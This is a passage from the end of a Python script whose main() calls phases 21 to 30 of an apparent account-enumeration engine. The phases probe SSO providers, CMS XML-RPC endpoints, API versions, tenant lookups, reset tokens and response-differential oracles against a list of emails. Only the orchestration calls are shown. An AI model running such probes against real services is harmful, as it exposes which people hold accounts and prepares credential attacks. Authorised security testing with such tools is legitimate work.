    # Phase 21: SSO Provider Probe (Azure AD, Okta, OneLogin, Ping, Keycloak)
    engine.sso_probe(emails)

    # Phase 22: XML-RPC / CMS Probe (WordPress, Joomla, Drupal)
    engine.xmlrpc_probe()

    # Phase 23: Pre-validation Endpoint Discovery
    engine.prevalidation_discovery()

    # Phase 24: Multi-tenant / Workspace Lookup
    engine.multitenant_lookup(emails)

    # Phase 25: API Version Brute-Force (v1-v10)
    engine.api_version_brute()

    # Phase 26: Double-Submit Differential
    engine.double_submit_analysis(emails)

    # Phase 27: ETag / Cache Header Differential
    engine.etag_cache_analysis(emails)

    # Phase 28: Error Classification Engine
    engine.error_classification(emails)

    # Phase 29: Password Reset Token Analysis
    engine.reset_token_analysis(emails)

    # Phase 30: Response Compression Oracle
    engine.compression_oracle(emails)

    # Report
    engine.report(output=args.output, fmt=args.format)


if __name__ == "__main__":
    main()
